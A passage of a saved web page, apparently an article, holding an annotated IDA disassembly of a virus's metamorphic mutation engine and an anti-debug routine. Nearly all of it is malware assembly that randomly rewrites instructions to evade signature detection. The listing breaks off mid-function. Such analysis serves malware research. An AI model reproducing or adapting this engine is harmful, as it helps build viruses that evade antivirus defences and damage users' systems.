<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3c.org/TR/1999/REC-html401-19991224/loose.dtd">
<!-- saved from url=(0054)http://www.openrce.org/articles/files/evol_disasm.html -->
<html><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252"><title>IDA - evol.idb</title>

<meta content="MSHTML 6.00.2900.2668" name="GENERATOR"></head>
<body bgcolor="#000040"><span style="BACKGROUND: #000040; COLOR: #c0c0c0"><pre>;
; ___________________________________________________________________________
; _     This file is generated by The Interactive Disassembler (IDA)        _
; _     Copyright (c) 2005 by DataRescue sa/nv, &lt;ida@datarescue.com&gt;        _
; ___________________________________________________________________________
;
<span style="COLOR: #c0c0c0">; ___________________________________________________________________________
</span><span style="COLOR: #c0c0c0">; START OF FUNCTION CHUNK FOR MetaEngine
</span>
<span style="COLOR: #ffff00">AntiDebug</span><span style="COLOR: #c0c0c0">:                                        </span><span style="COLOR: #00ff00">; CODE XREF: CODE:00401068j
</span>                                                  <span style="COLOR: #00ff00">; MetaEngine+1E9j
</span>                <span style="COLOR: #c0c0c0">cmp     byte ptr [ebx+</span><span style="COLOR: #00ffff">7</span><span style="COLOR: #c0c0c0">]</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">0BFh</span>    <span style="COLOR: white">; are we in kernel mode?
</span>                <span style="COLOR: #c0c0c0">jnz     short </span><span style="COLOR: #ffff00">ret_AntiDebug</span>
                <span style="COLOR: #c0c0c0">mov     ecx</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">1000h</span>                <span style="COLOR: white">; counter = 1000h
</span>                <span style="COLOR: #c0c0c0">mov     edi</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: red">40000000h</span>
                <span style="COLOR: #c0c0c0">or      edi</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">80000000h</span>
                <span style="COLOR: #c0c0c0">add     edi</span><span style="COLOR: #c0c0c0">, ecx</span>                  <span style="COLOR: white">; edi = C0001000h
</span>                <span style="COLOR: #c0c0c0">rep stosd                         </span><span style="COLOR: white">; copy bytes to edi
</span>
<span style="COLOR: #ffff00">ret_AntiDebug</span><span style="COLOR: #c0c0c0">:                                    </span><span style="COLOR: #00ff00">; CODE XREF: MetaEngine-17j
</span>                <span style="COLOR: #c0c0c0">retn                              </span><span style="COLOR: white">; return
</span><span style="COLOR: #c0c0c0">; END OF FUNCTION CHUNK FOR MetaEngine            </span><span style="COLOR: white">; this will result in a crash
</span>                                                  <span style="COLOR: white">; since this routine wasn't CALLed
</span>
<span style="COLOR: #c0c0c0">; _______________ S U B R O U T I N E _______________________________________
</span>
<span style="COLOR: #c0c0c0">; Attributes: bp-based frame
</span>
<span style="COLOR: #ffff00">MetaEngine      proc near                         </span><span style="COLOR: #00ff00">; CODE XREF: Infect+11Bp
</span>
<span style="COLOR: #00ff00">RelocStart      </span><span style="COLOR: #c0c0c0">= dword ptr </span><span style="COLOR: #00ffff">-8
</span><span style="COLOR: #00ff00">RelocCurrent    </span><span style="COLOR: #c0c0c0">= dword ptr </span><span style="COLOR: #00ffff">-4
</span><span style="COLOR: #00ff00">inBuf           </span><span style="COLOR: #c0c0c0">= dword ptr  </span><span style="COLOR: #00ffff">8
</span><span style="COLOR: #00ff00">sizeOfCode      </span><span style="COLOR: #c0c0c0">= dword ptr  </span><span style="COLOR: #00ffff">0Ch
</span><span style="COLOR: #00ff00">outBuf          </span><span style="COLOR: #c0c0c0">= dword ptr  </span><span style="COLOR: #00ffff">10h
</span>
                <span style="COLOR: #c0c0c0">push    ebp</span>
                <span style="COLOR: #c0c0c0">mov     ebp</span><span style="COLOR: #c0c0c0">, esp</span>
                <span style="COLOR: #c0c0c0">sub     esp</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">8</span>
                <span style="COLOR: #c0c0c0">push    ebx</span>
                <span style="COLOR: #c0c0c0">push    esi</span>                       <span style="COLOR: white">; save registers
</span>                <span style="COLOR: #c0c0c0">push    edi</span>
                <span style="COLOR: #c0c0c0">mov     eax</span><span style="COLOR: #c0c0c0">, [ebp+</span><span style="COLOR: #00ff00">sizeOfCode</span><span style="COLOR: #c0c0c0">]</span>     <span style="COLOR: white">; eax = size of code
</span>                <span style="COLOR: #c0c0c0">shl     eax</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">4</span>                    <span style="COLOR: white">; multiply by 16
</span>                <span style="COLOR: #c0c0c0">push    eax</span>
                <span style="COLOR: #c0c0c0">call    </span><span style="COLOR: #ffff00">callVirtualAlloc</span>          <span style="COLOR: white">; allocate memory
</span>                <span style="COLOR: #c0c0c0">mov     [ebp+</span><span style="COLOR: #00ff00">RelocStart</span><span style="COLOR: #c0c0c0">]</span><span style="COLOR: #c0c0c0">, eax</span>     <span style="COLOR: white">; save pointer
</span>                <span style="COLOR: #c0c0c0">mov     [ebp+</span><span style="COLOR: #00ff00">RelocCurrent</span><span style="COLOR: #c0c0c0">]</span><span style="COLOR: #c0c0c0">, eax</span>
                <span style="COLOR: #c0c0c0">mov     esi</span><span style="COLOR: #c0c0c0">, [ebp+</span><span style="COLOR: #00ff00">inBuf</span><span style="COLOR: #c0c0c0">]</span>          <span style="COLOR: white">; esi = *source buffer
</span>                <span style="COLOR: #c0c0c0">mov     edi</span><span style="COLOR: #c0c0c0">, [ebp+</span><span style="COLOR: #00ff00">outBuf</span><span style="COLOR: #c0c0c0">]</span>         <span style="COLOR: white">; edi = *destination buffer
</span>
<span style="COLOR: #ffff00">LoadInstruction</span><span style="COLOR: #c0c0c0">:                                  </span><span style="COLOR: #00ff00">; CODE XREF: MetaEngine+52j
</span>                                                  <span style="COLOR: #00ff00">; MetaEngine+ABj ...
</span>                <span style="COLOR: #c0c0c0">mov     ebx</span><span style="COLOR: #c0c0c0">, [ebp+</span><span style="COLOR: #00ff00">RelocCurrent</span><span style="COLOR: #c0c0c0">]</span>
                <span style="COLOR: #c0c0c0">add     [ebp+</span><span style="COLOR: #00ff00">RelocCurrent</span><span style="COLOR: #c0c0c0">]</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">10h</span>   <span style="COLOR: white">; allocate 16 bytes for each instruction
</span>                <span style="COLOR: #c0c0c0">mov     [ebx]</span><span style="COLOR: #c0c0c0">, esi</span>                <span style="COLOR: white">; set Pointer to Instruction in the Input Buffer
</span>                <span style="COLOR: #c0c0c0">mov     [ebx+</span><span style="COLOR: #00ffff">4</span><span style="COLOR: #c0c0c0">]</span><span style="COLOR: #c0c0c0">, edi</span>              <span style="COLOR: white">; set Pointer to Mutated Instruction in Output Buffer
</span>                <span style="COLOR: #c0c0c0">xor     eax</span><span style="COLOR: #c0c0c0">, eax</span>                  <span style="COLOR: white">; eax = 0
</span>                <span style="COLOR: #c0c0c0">mov     [ebx+</span><span style="COLOR: #00ffff">8</span><span style="COLOR: #c0c0c0">]</span><span style="COLOR: #c0c0c0">, eax</span>              <span style="COLOR: white">; set Pointer to offset of New Relative = 0
</span>                <span style="COLOR: #c0c0c0">cmp     esi</span><span style="COLOR: #c0c0c0">, [ebp+</span><span style="COLOR: #00ff00">inBuf</span><span style="COLOR: #c0c0c0">]</span>          <span style="COLOR: white">; are we in the beginning of the code?
</span>                <span style="COLOR: #c0c0c0">jz      </span><span style="COLOR: #ffff00">isJccShort</span>                <span style="COLOR: white">; yes, start analyzing the code
</span>                <span style="COLOR: #c0c0c0">mov     eax</span><span style="COLOR: #c0c0c0">, esi</span>                  <span style="COLOR: white">; eax = *current instruction
</span>                <span style="COLOR: #c0c0c0">sub     eax</span><span style="COLOR: #c0c0c0">, [ebp+</span><span style="COLOR: #00ff00">inBuf</span><span style="COLOR: #c0c0c0">]</span>          <span style="COLOR: white">; eax -= *start address
</span>                <span style="COLOR: #c0c0c0">cmp     eax</span><span style="COLOR: #c0c0c0">, [ebp+</span><span style="COLOR: #00ff00">sizeOfCode</span><span style="COLOR: #c0c0c0">]</span>     <span style="COLOR: white">; are we done?
</span>                <span style="COLOR: #c0c0c0">jnb     </span><span style="COLOR: #ffff00">FixRelocations</span>
                <span style="COLOR: #c0c0c0">mov     al</span><span style="COLOR: #c0c0c0">, [esi]</span>                 <span style="COLOR: white">; al = opcode
</span>                <span style="COLOR: #c0c0c0">cmp     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">90h</span>                   <span style="COLOR: white">; NOP?
</span>                <span style="COLOR: #c0c0c0">jnz     short </span><span style="COLOR: #ffff00">isPushR32</span>
                <span style="COLOR: #c0c0c0">add     esi</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">1</span>                    <span style="COLOR: white">; increase counter (instruction not stored)
</span>                <span style="COLOR: #c0c0c0">jmp     short </span><span style="COLOR: #ffff00">LoadInstruction</span>     <span style="COLOR: white">; load next instruction
</span><span style="COLOR: #c0c0c0">; ___________________________________________________________________________
</span>
<span style="COLOR: #ffff00">isPushR32</span><span style="COLOR: #c0c0c0">:                                        </span><span style="COLOR: #00ff00">; CODE XREF: MetaEngine+4Dj
</span>                <span style="COLOR: #c0c0c0">mov     cl</span><span style="COLOR: #c0c0c0">, [edi-</span><span style="COLOR: #00ffff">1</span><span style="COLOR: #c0c0c0">]</span>               <span style="COLOR: white">; cl = last written byte
</span>                <span style="COLOR: #c0c0c0">cmp     cl</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">50h</span>                   <span style="COLOR: white">; PUSH EAX?
</span>                <span style="COLOR: #c0c0c0">jb      </span><span style="COLOR: #ffff00">isJccShort</span>
                <span style="COLOR: #c0c0c0">cmp     cl</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">52h</span>                   <span style="COLOR: white">; PUSH EAX/ECX/EDX?
</span>                <span style="COLOR: #c0c0c0">ja      </span><span style="COLOR: #ffff00">isJccShort</span>
                <span style="COLOR: #c0c0c0">mov     eax</span><span style="COLOR: #c0c0c0">, [ebx]</span>                <span style="COLOR: white">; eax = [ebx] = [[DisasmCurrent]]
</span>                <span style="COLOR: #c0c0c0">sub     eax</span><span style="COLOR: #c0c0c0">, [ebx-</span><span style="COLOR: #00ffff">10h</span><span style="COLOR: #c0c0c0">]</span>            <span style="COLOR: white">; eax -= [[DisasmCurrent]-16]
</span>                <span style="COLOR: #c0c0c0">cmp     eax</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">1</span>                    <span style="COLOR: white">; was it only a 1-byte instruction?
</span>                <span style="COLOR: #c0c0c0">jnz     </span><span style="COLOR: #ffff00">isJccShort</span>                <span style="COLOR: white">; no, disasm next instruction
</span>                <span style="COLOR: #c0c0c0">call    </span><span style="COLOR: #ffff00">Rnd7</span>                      <span style="COLOR: #c0c0c0">; returns random eax (0 to 7)
</span>                <span style="COLOR: #c0c0c0">jnz     </span><span style="COLOR: #ffff00">isJccShort</span>                <span style="COLOR: white">; mutate?
</span>                <span style="COLOR: #c0c0c0">sub     cl</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">50h</span>                   <span style="COLOR: white">; get the register used
</span>
<span style="COLOR: #ffff00">MutatePush</span><span style="COLOR: #c0c0c0">:                                       </span><span style="COLOR: #00ff00">; CODE XREF: MetaEngine+D0j
</span>                                                  <span style="COLOR: #00ff00">; MetaEngine+EAj
</span>                <span style="COLOR: #c0c0c0">call    </span><span style="COLOR: #ffff00">Random</span>                    <span style="COLOR: white">; get random number
</span>                <span style="COLOR: #c0c0c0">and     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">3</span>                     <span style="COLOR: white">; make it between 0 - 3
</span>                <span style="COLOR: #c0c0c0">cmp     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">1</span>                     <span style="COLOR: white">; al = 1?
</span>                <span style="COLOR: #c0c0c0">jz      short </span><span style="COLOR: #ffff00">MakeMovRegRandom32</span>
                <span style="COLOR: #c0c0c0">cmp     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">2</span>                     <span style="COLOR: white">; al = 2?
</span>                <span style="COLOR: #c0c0c0">jz      short </span><span style="COLOR: #ffff00">MakeOpRegRandomReg</span>
                <span style="COLOR: #c0c0c0">cmp     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">3</span>                     <span style="COLOR: white">; al = 3?
</span>                <span style="COLOR: #c0c0c0">jz      short </span><span style="COLOR: #ffff00">MakeMovRegRandom8</span>
                <span style="COLOR: #c0c0c0">mov     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">8Bh</span>                   <span style="COLOR: white">; al = MOV r32, r/m32
</span>                <span style="COLOR: #c0c0c0">stosb                             </span><span style="COLOR: white">; store
</span>                <span style="COLOR: #c0c0c0">mov     al</span><span style="COLOR: #c0c0c0">, cl</span>                    <span style="COLOR: white">; al = register
</span>                <span style="COLOR: #c0c0c0">rol     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">3</span>                     <span style="COLOR: white">; place it in the [reg/opcode] field
</span>                <span style="COLOR: #c0c0c0">or      al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">1000101b</span>              <span style="COLOR: white">; set [mod] = 01, [reg] = 101 (ebp)
</span>                <span style="COLOR: #c0c0c0">stosb                             </span><span style="COLOR: white">; store
</span>                <span style="COLOR: #c0c0c0">call    </span><span style="COLOR: #ffff00">Random</span>                    <span style="COLOR: white">; get random number
</span>                <span style="COLOR: #c0c0c0">and     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">3Ch</span>                   <span style="COLOR: white">; make it between 0 to 3C
</span>                <span style="COLOR: #c0c0c0">stosb                             </span><span style="COLOR: white">; store
</span>                <span style="COLOR: #c0c0c0">jmp     </span><span style="COLOR: #ffff00">LoadInstruction</span>
<span style="COLOR: #c0c0c0">; ___________________________________________________________________________
</span>
<span style="COLOR: #ffff00">MakeMovRegRandom32</span><span style="COLOR: #c0c0c0">:                               </span><span style="COLOR: #00ff00">; CODE XREF: MetaEngine+8Ej
</span>                <span style="COLOR: #c0c0c0">mov     al</span><span style="COLOR: #c0c0c0">, cl</span>                    <span style="COLOR: white">; al = register
</span>                <span style="COLOR: #c0c0c0">add     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">0B8h</span>                  <span style="COLOR: white">; MOV r32,imm32
</span>                <span style="COLOR: #c0c0c0">stosb                             </span><span style="COLOR: white">; store
</span>                <span style="COLOR: #c0c0c0">call    </span><span style="COLOR: #ffff00">GetRandomDword</span>            <span style="COLOR: white">; get random dword
</span>                <span style="COLOR: #c0c0c0">stosd                             </span><span style="COLOR: white">; store dword
</span>                <span style="COLOR: #c0c0c0">jmp     </span><span style="COLOR: #ffff00">LoadInstruction</span>
<span style="COLOR: #c0c0c0">; ___________________________________________________________________________
</span>
<span style="COLOR: #ffff00">MakeOpRegRandomReg</span><span style="COLOR: #c0c0c0">:                               </span><span style="COLOR: #00ff00">; CODE XREF: MetaEngine+92j
</span>                <span style="COLOR: #c0c0c0">call    </span><span style="COLOR: #ffff00">Random</span>                    <span style="COLOR: white">; get random number
</span>                <span style="COLOR: #c0c0c0">mov     ah</span><span style="COLOR: #c0c0c0">, al</span>                    <span style="COLOR: white">; save it in ah
</span>                <span style="COLOR: #c0c0c0">or      ah</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">11000000b</span>             <span style="COLOR: white">; set [mod] = 11
</span>                <span style="COLOR: #c0c0c0">and     ah</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">11111000b</span>             <span style="COLOR: white">; clear [reg] field
</span>                <span style="COLOR: #c0c0c0">cmp     ah</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">11111000b</span>             <span style="COLOR: white">; is [reg/opcode] == 111 (CMP)?
</span>                <span style="COLOR: #c0c0c0">jz      short </span><span style="COLOR: #ffff00">MutatePush</span>          <span style="COLOR: white">; try another mutation
</span>                <span style="COLOR: #c0c0c0">mov     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">81h</span>                   <span style="COLOR: white">; al = OP r/m32, imm32
</span>                                                  <span style="COLOR: white">; (ADC/ADD/AND/CMP/OR/SBB/SUB/XOR)
</span>                <span style="COLOR: #c0c0c0">stosb                             </span><span style="COLOR: white">; store
</span>                <span style="COLOR: #c0c0c0">mov     al</span><span style="COLOR: #c0c0c0">, ah</span>                    <span style="COLOR: white">; al = random ModRM
</span>                <span style="COLOR: #c0c0c0">add     al</span><span style="COLOR: #c0c0c0">, cl</span>                    <span style="COLOR: white">; add register
</span>                <span style="COLOR: #c0c0c0">stosb                             </span><span style="COLOR: white">; store
</span>                <span style="COLOR: #c0c0c0">call    </span><span style="COLOR: #ffff00">GetRandomDword</span>            <span style="COLOR: white">; get random dword
</span>                <span style="COLOR: #c0c0c0">stosd                             </span><span style="COLOR: white">; store dword
</span>                <span style="COLOR: #c0c0c0">jmp     </span><span style="COLOR: #ffff00">LoadInstruction</span>
<span style="COLOR: #c0c0c0">; ___________________________________________________________________________
</span>
<span style="COLOR: #ffff00">MakeMovRegRandom8</span><span style="COLOR: #c0c0c0">:                                </span><span style="COLOR: #00ff00">; CODE XREF: MetaEngine+96j
</span>                <span style="COLOR: #c0c0c0">mov     al</span><span style="COLOR: #c0c0c0">, [edi-</span><span style="COLOR: #00ffff">1</span><span style="COLOR: #c0c0c0">]</span>               <span style="COLOR: white">; al = last written opcode
</span>                <span style="COLOR: #c0c0c0">cmp     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">54h</span>                   <span style="COLOR: white">; PUSH ESP/EBP/ESI/EDI?
</span>                <span style="COLOR: #c0c0c0">jnb     short </span><span style="COLOR: #ffff00">MutatePush</span>          <span style="COLOR: white">; avoid
</span>                <span style="COLOR: #c0c0c0">call    </span><span style="COLOR: #ffff00">Random</span>                    <span style="COLOR: white">; get random number
</span>                <span style="COLOR: #c0c0c0">and     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">100b</span>                  <span style="COLOR: white">; make it 0 to 4
</span>                <span style="COLOR: #c0c0c0">add     al</span><span style="COLOR: #c0c0c0">, cl</span>                    <span style="COLOR: white">; add register
</span>                <span style="COLOR: #c0c0c0">add     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">0B0h</span>                  <span style="COLOR: white">; al = MOV r8, imm8
</span>                <span style="COLOR: #c0c0c0">stosb                             </span><span style="COLOR: white">; store
</span>                <span style="COLOR: #c0c0c0">call    </span><span style="COLOR: #ffff00">Random</span>                    <span style="COLOR: white">; get random byte
</span>                <span style="COLOR: #c0c0c0">stosb                             </span><span style="COLOR: white">; store
</span>                <span style="COLOR: #c0c0c0">jmp     </span><span style="COLOR: #ffff00">LoadInstruction</span>
<span style="COLOR: #c0c0c0">; ___________________________________________________________________________
</span>
<span style="COLOR: #ffff00">isJccShort</span><span style="COLOR: #c0c0c0">:                                       </span><span style="COLOR: #00ff00">; CODE XREF: MetaEngine+35j
</span>                                                  <span style="COLOR: #00ff00">; MetaEngine+5Aj ...
</span>                <span style="COLOR: #c0c0c0">mov     al</span><span style="COLOR: #c0c0c0">, [esi]</span>                 <span style="COLOR: white">; al = opcode
</span>                <span style="COLOR: #c0c0c0">cmp     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">70h</span>                   <span style="COLOR: white">; is it a Jcc?
</span>                <span style="COLOR: #c0c0c0">jb      short </span><span style="COLOR: #ffff00">isBranchShort</span>
                <span style="COLOR: #c0c0c0">cmp     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">80h</span>                   <span style="COLOR: white">; if it's between 70h to 7Fh, it is a Jcc
</span>                <span style="COLOR: #c0c0c0">jb      short </span><span style="COLOR: #ffff00">ModifyJcc</span>
                <span style="COLOR: #c0c0c0">cmp     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">0EBh</span>                  <span style="COLOR: white">; is it a JMP short?
</span>                <span style="COLOR: #c0c0c0">jnz     short </span><span style="COLOR: #ffff00">isBranchShort</span>
                <span style="COLOR: #c0c0c0">mov     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">0E9h</span>                  <span style="COLOR: white">; Generate a JMP near
</span>                <span style="COLOR: #c0c0c0">jmp     short </span><span style="COLOR: #ffff00">ModifyJccAddress</span>
<span style="COLOR: #c0c0c0">; ___________________________________________________________________________
</span>
<span style="COLOR: #ffff00">ModifyJcc</span><span style="COLOR: #c0c0c0">:                                        </span><span style="COLOR: #00ff00">; CODE XREF: MetaEngine+10Bj
</span>                <span style="COLOR: #c0c0c0">mov     byte ptr [edi]</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">0Fh</span>       <span style="COLOR: white">; set 0F opcode
</span>                <span style="COLOR: #c0c0c0">add     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">10h</span>                   <span style="COLOR: white">; add 10h
</span>                                                  <span style="COLOR: white">; (70 xx    = JO short xx)
</span>                                                  <span style="COLOR: white">; (0F 80 xx = JO near  xx)
</span>                <span style="COLOR: #c0c0c0">add     edi</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">1</span>                    <span style="COLOR: white">; increase output counter
</span>
<span style="COLOR: #ffff00">ModifyJccAddress</span><span style="COLOR: #c0c0c0">:                                 </span><span style="COLOR: #00ff00">; CODE XREF: MetaEngine+113j
</span>                <span style="COLOR: #c0c0c0">stosb                             </span><span style="COLOR: white">; store
</span>                <span style="COLOR: #c0c0c0">mov     [ebx+</span><span style="COLOR: #00ffff">8</span><span style="COLOR: #c0c0c0">]</span><span style="COLOR: #c0c0c0">, edi</span>              <span style="COLOR: white">; save edi in the OffsetNewRelative field
</span>                <span style="COLOR: #c0c0c0">mov     al</span><span style="COLOR: #c0c0c0">, [esi+</span><span style="COLOR: #00ffff">1</span><span style="COLOR: #c0c0c0">]</span>               <span style="COLOR: white">; al = relative address
</span>                <span style="COLOR: #c0c0c0">add     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">2</span>                     <span style="COLOR: white">; al += 2, because we added two bytes
</span>                <span style="COLOR: #c0c0c0">call    </span><span style="COLOR: #ffff00">InvertSign</span>
                <span style="COLOR: #c0c0c0">mov     [ebx+</span><span style="COLOR: #00ffff">0Ch</span><span style="COLOR: #c0c0c0">]</span><span style="COLOR: #c0c0c0">, eax</span>            <span style="COLOR: white">; save eax in the NewRelative field
</span>                <span style="COLOR: #c0c0c0">add     esi</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">2</span>                    <span style="COLOR: white">; increase code pointer by 2
</span>                <span style="COLOR: #c0c0c0">add     edi</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">4</span>                    <span style="COLOR: white">; increase output pointer by 4 (dword)
</span>                <span style="COLOR: #c0c0c0">jmp     </span><span style="COLOR: #ffff00">LoadInstruction</span>
<span style="COLOR: #c0c0c0">; ___________________________________________________________________________
</span>
<span style="COLOR: #ffff00">isBranchShort</span><span style="COLOR: #c0c0c0">:                                    </span><span style="COLOR: #00ff00">; CODE XREF: MetaEngine+107j
</span>                                                  <span style="COLOR: #00ff00">; MetaEngine+10Fj
</span>                <span style="COLOR: #c0c0c0">cmp     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">0E8h</span>                  <span style="COLOR: white">; a CALL short?
</span>                <span style="COLOR: #c0c0c0">jz      short </span><span style="COLOR: #ffff00">ModifyBranchAddress</span>
                <span style="COLOR: #c0c0c0">cmp     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">0E9h</span>                  <span style="COLOR: white">; a JMP short?
</span>                <span style="COLOR: #c0c0c0">jz      short </span><span style="COLOR: #ffff00">ModifyBranchAddress</span>
                <span style="COLOR: #c0c0c0">cmp     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">0Fh</span>                   <span style="COLOR: white">; a special opcode 0F?
</span>                <span style="COLOR: #c0c0c0">jnz     short </span><span style="COLOR: #ffff00">isEspUsed</span>
                <span style="COLOR: #c0c0c0">mov     cl</span><span style="COLOR: #c0c0c0">, [esi+</span><span style="COLOR: #00ffff">1</span><span style="COLOR: #c0c0c0">]</span>               <span style="COLOR: white">; get next byte
</span>                <span style="COLOR: #c0c0c0">cmp     cl</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">80h</span>                   <span style="COLOR: white">; Jcc near?
</span>                <span style="COLOR: #c0c0c0">jb      </span><span style="COLOR: #ffff00">AbortEngine</span>               <span style="COLOR: white">; is it between 80h and 90h?
</span>                <span style="COLOR: #c0c0c0">cmp     cl</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">90h</span>                   <span style="COLOR: white">; The engine doesn't support 0F xx instructions
</span>                <span style="COLOR: #c0c0c0">jnb     </span><span style="COLOR: #ffff00">AbortEngine</span>
                <span style="COLOR: #c0c0c0">stosb                             </span><span style="COLOR: white">; store 0F opcode
</span>                <span style="COLOR: #c0c0c0">add     esi</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">1</span>                    <span style="COLOR: white">; increase code pointer
</span>                <span style="COLOR: #c0c0c0">mov     al</span><span style="COLOR: #c0c0c0">, cl</span>                    <span style="COLOR: white">; al = second opcode
</span>
<span style="COLOR: #ffff00">ModifyBranchAddress</span><span style="COLOR: #c0c0c0">:                              </span><span style="COLOR: #00ff00">; CODE XREF: MetaEngine+13Bj
</span>                                                  <span style="COLOR: #00ff00">; MetaEngine+13Fj
</span>                <span style="COLOR: #c0c0c0">stosb                             </span><span style="COLOR: white">; save branch type
</span>                <span style="COLOR: #c0c0c0">mov     [ebx+</span><span style="COLOR: #00ffff">8</span><span style="COLOR: #c0c0c0">]</span><span style="COLOR: #c0c0c0">, edi</span>              <span style="COLOR: white">; save edi in the OffsetNewRelative field
</span>                <span style="COLOR: #c0c0c0">add     esi</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">1</span>                    <span style="COLOR: white">; increase code pointer
</span>                <span style="COLOR: #c0c0c0">lodsd                             </span><span style="COLOR: white">; load the address
</span>                <span style="COLOR: #c0c0c0">add     eax</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">4</span>                    <span style="COLOR: white">; eax += 4
</span>                <span style="COLOR: #c0c0c0">sub     eax</span><span style="COLOR: #c0c0c0">, [ebx+</span><span style="COLOR: #00ffff">4</span><span style="COLOR: #c0c0c0">]</span>              <span style="COLOR: white">; get OutputIP
</span>                <span style="COLOR: #c0c0c0">add     eax</span><span style="COLOR: #c0c0c0">, edi</span>                  <span style="COLOR: white">; add OutputBuffer
</span>                <span style="COLOR: #c0c0c0">mov     [ebx+</span><span style="COLOR: #00ffff">0Ch</span><span style="COLOR: #c0c0c0">]</span><span style="COLOR: #c0c0c0">, eax</span>            <span style="COLOR: white">; save eax in the NewRelative field
</span>                <span style="COLOR: #c0c0c0">add     edi</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">4</span>                    <span style="COLOR: white">; increase output pointer by 4 (dword)
</span>                <span style="COLOR: #c0c0c0">jmp     </span><span style="COLOR: #ffff00">LoadInstruction</span>
<span style="COLOR: #c0c0c0">; ___________________________________________________________________________
</span>
<span style="COLOR: #ffff00">isEspUsed</span><span style="COLOR: #c0c0c0">:                                        </span><span style="COLOR: #00ff00">; CODE XREF: MetaEngine+143j
</span>                <span style="COLOR: #c0c0c0">cmp     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">81h</span>                   <span style="COLOR: white">; OP r/m32, imm32?
</span>                                                  <span style="COLOR: white">; (ADC/ADD/AND/CMP/OR/SBB/SUB/XOR)
</span>                <span style="COLOR: #c0c0c0">jnz     short </span><span style="COLOR: #ffff00">isRet_isC0_is83</span>
                <span style="COLOR: #c0c0c0">mov     ah</span><span style="COLOR: #c0c0c0">, [esi+</span><span style="COLOR: #00ffff">1</span><span style="COLOR: #c0c0c0">]</span>               <span style="COLOR: white">; ah = ModRM
</span>                <span style="COLOR: #c0c0c0">cmp     ah</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">0C4h</span>                  <span style="COLOR: white">; ADD ESP, imm32?
</span>                <span style="COLOR: #c0c0c0">jz      short </span><span style="COLOR: #ffff00">Store6Bytes</span>         <span style="COLOR: white">; avoid
</span>                <span style="COLOR: #c0c0c0">cmp     ah</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">0ECh</span>                  <span style="COLOR: white">; SUB ESP, imm32?
</span>                <span style="COLOR: #c0c0c0">jnz     short </span><span style="COLOR: #ffff00">isRet_isC0_is83</span>     <span style="COLOR: white">; avoid
</span>
<span style="COLOR: #ffff00">Store6Bytes</span><span style="COLOR: #c0c0c0">:                                      </span><span style="COLOR: #00ff00">; CODE XREF: MetaEngine+185j
</span>                <span style="COLOR: #c0c0c0">mov     cl</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">6</span>
                <span style="COLOR: #c0c0c0">jmp     </span><span style="COLOR: #ffff00">StoreBytes</span>
<span style="COLOR: #c0c0c0">; ___________________________________________________________________________
</span>
<span style="COLOR: #ffff00">isRet_isC0_is83</span><span style="COLOR: #c0c0c0">:                                  </span><span style="COLOR: #00ff00">; CODE XREF: MetaEngine+17Dj
</span>                                                  <span style="COLOR: #00ff00">; MetaEngine+18Aj
